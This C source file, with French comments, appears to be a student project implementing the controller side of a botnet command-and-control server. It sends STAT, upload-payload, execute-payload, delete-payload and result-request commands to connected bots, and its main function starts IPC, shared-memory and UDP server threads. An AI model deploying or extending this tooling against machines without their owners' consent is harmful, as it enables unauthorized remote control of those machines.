                printf("[Client TCP] Demande stat du bot ip : %s\n",(char*)ip);
                fprintf(dialogue,"%s","STAT\n");
                char reponse_stat[MAX_TAMPON]=""; // Reception du message STAT
                if(fgets(reponse_stat,MAX_TAMPON,dialogue)!=NULL){
                    printf("Reponse du bot :%s\n",reponse_stat);
                }
            }
            //-----------------------------------------------------------------
            // 		                  Upload une charge
            //-----------------------------------------------------------------
            else if(num_fonction==2){// installe charge
                P_semaphore_thread(&mutex_charge);
                charge_t ma_charge=charge_to_send;
                V_semaphore_thread(&mutex_charge);

                printf("[Client TCP] debut installation \n");
                Installation_charge_utile(dialogue,ma_charge);
                printf("[Client TCP] fin installation\n");
            }
            //-----------------------------------------------------------------
            // 		                  Execute une charge
            //-----------------------------------------------------------------
            else if(num_fonction==3){// execute charge
                printf("[Client TCP] debut execution de la charge : %s\n",nom_charge);
                Execution_charge_bot(dialogue,nom_charge);
                printf("[Client TCP] fin execution\n");
            }
            //-----------------------------------------------------------------
            // 		                  Supprime une charge
            //-----------------------------------------------------------------
            else if(num_fonction==4){// supprime charge
                printf("[Client TCP] debut suppression sur la charge : %s\n",nom_charge);
                Suppression_charge_bot(dialogue,nom_charge);
                printf("[Client TCP] fin de suppression\n");
            }
            //-----------------------------------------------------------------
            // 		                  Resultat d'execution
            //-----------------------------------------------------------------
            else if(num_fonction==5){// demande resultat d'execution
                int indice_execution = indice_charge;
                printf("[Client TCP] Je travaille sur l'index : %d\n",indice_execution);
                printf("\t[Client TCP] debut demande result execution\n");
                Demande_resultat_execution(dialogue,indice_execution);
                printf("\t[Client TCP] fin demande d'execution\n");
           }
           //-----------------------------------------------------------------
           // 		                      QUIT
           //-----------------------------------------------------------------
            else if(num_fonction==6){// QUIT
                printf("[Client TCP] Quitte la connection TCP\n");
                fprintf(dialogue,"%s","QUIT\n");
                break;
            }

            P_semaphore_thread(&mutex_travail);
            travail[0]=-1;
            travail[1]=-1;
            travail[2]=-1;
            V_semaphore_thread(&mutex_travail);
        }
    }

    int indice_file=est_ip_bot(file_bot_connecte, ip);
    printf("fin de la connection avec le bot :%s, indice dans la file : %d\n",(char*)ip,indice_file);
    strcpy(file_bot_connecte.tab_IP[indice_file],"");
   shutdown(socket,SHUT_RDWR);
   return NULL;
}


int main(){
    int s4=0;
    charge_to_send.name=NULL;//init
    charge_to_send.data=NULL;//init

    init_semaphore_thread(&mutex_charge);
    init_semaphore_thread(&mutex_signal);
    init_semaphore_thread(&mutex_travail);
	init_semaphore_thread(&mutex_shm);
	init_semaphore_thread(&mutex_shm_2);
	init_signal_thread(&cnd);

    /* init tableaux de bot connectes */
    file_bot_connecte.nb_bot=0;
    init_semaphore_thread(&(file_bot_connecte.mutex_tab_ip));

	/* init tableau nom de charge */
	tableau_charge.indice=0;
	init_semaphore_thread(&tableau_charge.mutex_nom_charge);

	/* init tableau d'IP */
	tableau_ip.nb_bot=0;
	init_semaphore_thread(&(tableau_ip.mutex_tab_ip));


	/* Mise en place d'un gestionnaire de signal */
	struct sigaction prepaSignal;
	prepaSignal.sa_handler=&handler;
	prepaSignal.sa_flags=0;
	sigemptyset(&prepaSignal.sa_mask);
	sigaction(SIGINT,&prepaSignal,0);


	/* Serveurs */
	lancer_flux(TASK_file_message_IPC,NULL,0);
	lancer_flux(TASK_memoire_partagee_SHM,NULL,0);
    lancer_flux(serveurUDP, (void *) &s4,sizeof(int));

	synchro_thread();
	return 0;
}
